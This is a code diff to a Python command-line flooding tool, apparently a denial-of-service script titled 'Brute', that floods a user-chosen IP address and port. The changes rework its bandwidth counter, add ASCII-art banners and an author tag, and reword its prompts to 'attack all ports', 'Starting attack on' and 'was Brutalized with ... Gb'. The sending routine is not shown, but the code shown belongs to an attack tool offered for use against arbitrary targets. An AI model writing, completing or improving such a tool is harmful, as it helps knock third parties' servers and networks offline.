@@ -6,50 +6,7 @@ from time import time, sleep
 
 from pystyle import *
 from getpass import getpass as hinput
-
-import time
-
-# ...
-
-class Brutalize:
-    def __init__(self, ip, port, force, threads):
-        # ...
-
-    def info(self):
-        interval = 0.05
-        now = time.time() * 1000  # Current time in milliseconds
-
-        size = 0
-        self.total = 0
-
-        bytediff = 8
-        mb = 1000000
-        gb = 1000000000
-
-        while self.on:
-            sleep(interval)
-            if not self.on:
-                break
-
-            # ...
-
-            now2 = time.time() * 1000  # Current time in milliseconds
-
-            if now + 1000 >= now2:  # Increase second after 1000 milliseconds (1 second)
-                continue
-
-            size = round(self.sent * bytediff / mb)
-            self.sent = 0
-
-            now += 1000  # Increase current time by 1000 milliseconds (1 second)
-
-
-
-
-
-
-
-
+            
 
 class Brutalize:
 
@@ -71,10 +28,10 @@ class Brutalize:
             Thread(target=self.send).start()
         Thread(target=self.info).start()
     
+    
     def info(self):
-
         interval = 0.05
-        now = time()
+        now = time.time() * 1000  # Current time in milliseconds
 
         size = 0
         self.total = 0
@@ -82,7 +39,6 @@ class Brutalize:
         bytediff = 8
         mb = 1000000
         gb = 1000000000
-        
 
         while self.on:
             sleep(interval)
@@ -93,15 +49,17 @@ class Brutalize:
                 self.total += self.sent * bytediff / gb * interval
                 print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
 
-            now2 = time()
-        
-            if now + 1 >= now2:
+            now2 = time.time() * 1000  # Current time in milliseconds
+       
+
+            if now + 1000 >= now2:  # Increase second after 1000 milliseconds (1 second)
                 continue
-            
+
             size = round(self.sent * bytediff / mb)
             self.sent = 0
 
-            now += 1
+            now += 1000  # Increase current time by 1000 milliseconds (1 second)
+
 
     def stop(self):
         self.on = False
@@ -124,12 +82,41 @@ class Brutalize:
 
 ascii = r'''
 
-  '''
+▀█████████▄     ▄████████ ███    █▄      ███        ▄████████ 
+  ███    ███   ███    ███ ███    ███ ▀█████████▄   ███    ███ 
+  ███    ███   ███    ███ ███    ███    ▀███▀▀██   ███    █▀  
+ ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███     ███   ▀  ▄███▄▄▄     
+▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███     ███     ▀▀███▀▀▀     
+  ███    ██▄ ▀███████████ ███    ███     ███       ███    █▄  
+  ███    ███   ███    ███ ███    ███     ███       ███    ███ 
+▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████ 
+               ███    ███                                              '''
 
 
 
 banner = r"""
-       """.replace('', '')
+       █████████████████████
+    ████▀                 ▀████
+  ███▀                       ▀███
+ ██▀                           ▀██
+█▀                               ▀█
+█                                 █
+█   █████                 █████   █
+█  ██▓▓▓███             ███▓▓▓██  █
+█  ██▓▓▓▓▓██           ██▓▓▓▓▓██  █
+█  ██▓▓▓▓▓▓██         ██▓▓▓▓▓▓██  █
+█▄  ████▓▓▓▓██       ██▓▓▓▓████  ▄█
+▀█▄   ▀███▓▓▓██     ██▓▓▓███▀   ▄█▀
+  █▄    ▀█████▀     ▀█████▀    ▄█
+  ██           ▄█ █▄           ██
+  ██           ██ ██           ██
+  ██                           ██
+  ▀██  ██▀██  █  █  █  ██▀██  ██▀
+   ▀████▀ ██  █  █  █  ██ ▀████▀
+          ██  █  █  █  ██  
+          ██  █  █  █  ██
+          ██  █  █  █  ██
+           █▄▄█▄▄█▄▄█▄▄█""".replace('▓', '▀')
 
 
 banner = Add.Add(ascii, banner, center=True)
@@ -144,7 +131,7 @@ purple = Col.StaticMIX((Col.purple, blue, Col.white))
 
 
 def init():
-    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. ".replace('.',''))
+    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
     Cursor.HideCursor()
 
 
@@ -178,7 +165,7 @@ def main():
 
 
 
-    port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{white} to Go all ports{purple}] {purple}->{fluo2} ", '?'))
+    port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ", '?'))
     print()
 
     if port == '':
@@ -217,7 +204,7 @@ def main():
 
     print()
     cport = '' if port is None else f'{purple}:{fluo2}{port}'
-    print(stage(f"Starting Go on {fluo2}{ip}{cport}{white}."), end='\r')
+    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
 
 
     brute = Brutalize(ip, port, force, threads)
@@ -225,13 +212,13 @@ def main():
         brute.flood()
     except:
         brute.stop()
-        error("A fatal error has occured and the Go was stopped.", '')
+        error("A fatal error has occured and the attack was stopped.", '')
     try:
         while True:
             sleep(1000000)
     except KeyboardInterrupt:
         brute.stop()
-        print(stage(f"Go stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
+        print(stage(f"Attack stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
     print('\n')
     sleep(1)
 
